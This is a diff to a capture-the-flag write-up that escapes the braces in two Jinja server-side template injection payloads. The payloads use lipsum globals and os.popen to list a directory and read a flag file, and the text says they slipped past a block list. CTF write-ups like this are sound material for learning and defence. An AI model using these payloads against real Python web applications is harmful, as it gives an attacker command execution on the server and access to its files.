@@ -23,7 +23,7 @@ This means we can't fetch any useful information from the above variables.
 
 I decided to use the short lipsum payload. It's a really compact SSTI payload for python apps, and this evaded the block list.
 ```
-{{lipsum.__globals__.os.popen('ls').read()}}
+\{\{lipsum.__globals__.os.popen('ls').read()\}\}
 ```
 
 This shows us a directory listing. We now have code execution, so we can simply look around for the flag and cat it.
@@ -31,5 +31,6 @@ This shows us a directory listing. We now have code execution, so we can simply 
 And we see it! A file named `flag.log`. Final payload:
 
 ```
-{"test": "{{lipsum.__globals__.os.popen('cat flag.log').read()}}"}
+{"test": "\{\{lipsum.__globals__.os.popen('cat flag.log').read()\}\}"}
 ```
+
